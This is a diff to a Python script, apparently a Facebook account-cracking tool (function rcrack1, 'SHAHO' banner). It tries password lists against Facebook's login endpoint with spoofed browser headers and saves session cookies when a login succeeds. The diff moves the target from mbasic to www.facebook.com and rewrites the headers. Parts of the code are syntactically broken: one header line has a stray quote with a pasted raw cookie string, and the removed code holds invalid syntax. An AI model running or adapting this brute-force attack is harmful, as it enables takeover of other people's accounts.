@@ -227,7 +227,7 @@ def rcrack1(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sSHAHO\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://www.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -239,29 +239,26 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb ={
-	   'authority': 'mbasic.facebook.com',
-           'method':'GET',
-           'scheme':'https',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    
+           'authority': 'www.facebook.com',
+           'accept': '*/*',
            'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-           'cache-control': 'max-age=0',
-           'dpr': '2.15625',
-           'referer': 'https://mbasic.facebook.com/home.php?ref_component=mbasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=7&paipv=0&eav=AfZ8w25pSm21P35t3PryjJh0Pfaz-7KqoaqgHFAlTn7Lyz_Hw0yl2RCX47FvEW0z28k',
+           'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryxgImR75BE2VMYAeJ', presence=EDvF3EtimeF1715581501EuserFA21B57519204333A2EstateFDutF0CEchF_7bCC; m_page_voice=100057519204333; dpr=1.9790045022964478; wd=891x1751',
+           'origin': 'https://www.facebook.com',
+           'referer': 'https://www.facebook.com/checkpoint/601051028565049/',
            'sec-ch-prefers-color-scheme': 'light',
-           'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-           'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+           'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+           'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
+           'sec-fetch-dest': 'empty',
+           'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': def fuckx(),
+           'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'viewport-width': '980',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
